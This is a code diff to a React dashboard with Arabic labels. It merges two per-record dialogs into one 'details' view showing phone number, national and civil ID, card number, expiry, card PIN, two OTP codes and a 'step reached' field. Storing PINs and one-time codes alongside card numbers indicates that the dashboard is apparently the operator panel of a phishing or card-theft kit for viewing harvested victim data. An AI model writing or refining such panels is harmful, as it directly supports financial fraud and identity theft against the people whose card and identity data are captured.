@@ -475,22 +475,13 @@ export default function Dashboard() {
                             </div>
                           </td>
                           <td className="px-4 py-3">
-                            <div className="flex gap-2 flex-wrap">
-                              <Badge
-                                variant="outline"
-                                className={`cursor-pointer text-xs transition-all hover:scale-105 ${r.phone_number ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white border-0" : "opacity-40"}`}
-                                onClick={r.phone_number ? () => openDialog(r, "personal") : undefined}
-                              >
-                                <User className="h-3 w-3 ml-1" />معلومات شخصية
-                              </Badge>
-                              <Badge
-                                variant="outline"
-                                className={`cursor-pointer text-xs transition-all hover:scale-105 ${r.card_number ? "bg-gradient-to-r from-green-500 to-green-600 text-white border-0" : "opacity-40"}`}
-                                onClick={r.card_number ? () => openDialog(r, "card") : undefined}
-                              >
-                                <CreditCard className="h-3 w-3 ml-1" />بطاقة
-                              </Badge>
-                            </div>
+                            <Badge
+                              variant="outline"
+                              className="cursor-pointer text-xs transition-all hover:scale-105 bg-gradient-to-r from-blue-500 to-green-500 text-white border-0"
+                              onClick={() => openDialog(r, "all")}
+                            >
+                              <User className="h-3 w-3 ml-1" />تفاصيل
+                            </Badge>
                           </td>
                           <td className="px-4 py-3">
                             <div className="flex items-center gap-1 flex-wrap">
@@ -527,32 +518,32 @@ export default function Dashboard() {
         <DialogContent className="max-w-md" dir="rtl">
           <DialogHeader>
             <DialogTitle className="flex items-center gap-3 text-xl font-semibold">
-              <div className={`w-10 h-10 rounded-full flex items-center justify-center bg-gradient-to-br ${dialogType === "personal" ? "from-blue-400 to-blue-600" : "from-green-400 to-green-600"} shadow-md`}>
-                {dialogType === "personal" ? <User className="h-5 w-5 text-white" /> : <CreditCard className="h-5 w-5 text-white" />}
+              <div className="w-10 h-10 rounded-full flex items-center justify-center bg-gradient-to-br from-blue-500 to-green-500 shadow-md">
+                <User className="h-5 w-5 text-white" />
               </div>
-              {dialogType === "personal" ? "المعلومات الشخصية" : "معلومات البطاقة"}
+              تفاصيل السجل
             </DialogTitle>
           </DialogHeader>
 
-          {selectedRecord && dialogType === "personal" && (
-            <InfoSection items={[
-              { label: "رقم الهاتف", value: selectedRecord.phone_number },
-              { label: "رقم الهوية", value: selectedRecord.id_number, sensitive: true },
-              { label: "الرقم المدني", value: selectedRecord.civil_id, sensitive: true },
-              { label: "المبلغ", value: selectedRecord.amount },
-              { label: "الخطوة", value: selectedRecord.step_reached },
-            ]} />
-          )}
-
-          {selectedRecord && dialogType === "card" && (
-            <InfoSection items={[
-              { label: "رقم البطاقة", value: selectedRecord.card_number ? `${selectedRecord.card_prefix || ""} - ${selectedRecord.card_number}` : null },
-              { label: "تاريخ الانتهاء", value: selectedRecord.expiry_year && selectedRecord.expiry_month ? `${selectedRecord.expiry_year}/${selectedRecord.expiry_month}` : null },
-              { label: "الرقم السري", value: selectedRecord.pin, sensitive: true },
-              { label: "رمز OTP1", value: selectedRecord.otp1, sensitive: true },
-              { label: "رمز OTP2", value: selectedRecord.otp2, sensitive: true },
-              { label: "المبلغ", value: selectedRecord.amount },
-            ]} />
+          {selectedRecord && (
+            <>
+              <p className="text-sm font-semibold text-slate-500 mt-2">المعلومات الشخصية</p>
+              <InfoSection items={[
+                { label: "رقم الهاتف", value: selectedRecord.phone_number },
+                { label: "رقم الهوية", value: selectedRecord.id_number, sensitive: true },
+                { label: "الرقم المدني", value: selectedRecord.civil_id, sensitive: true },
+                { label: "المبلغ", value: selectedRecord.amount },
+                { label: "الخطوة", value: selectedRecord.step_reached },
+              ]} />
+              <p className="text-sm font-semibold text-slate-500 mt-3">معلومات البطاقة</p>
+              <InfoSection items={[
+                { label: "رقم البطاقة", value: selectedRecord.card_number ? `${selectedRecord.card_prefix || ""} - ${selectedRecord.card_number}` : null },
+                { label: "تاريخ الانتهاء", value: selectedRecord.expiry_year && selectedRecord.expiry_month ? `${selectedRecord.expiry_year}/${selectedRecord.expiry_month}` : null },
+                { label: "الرقم السري", value: selectedRecord.pin, sensitive: true },
+                { label: "رمز OTP1", value: selectedRecord.otp1, sensitive: true },
+                { label: "رمز OTP2", value: selectedRecord.otp2, sensitive: true },
+              ]} />
+            </>
           )}
 
           <DialogFooter>
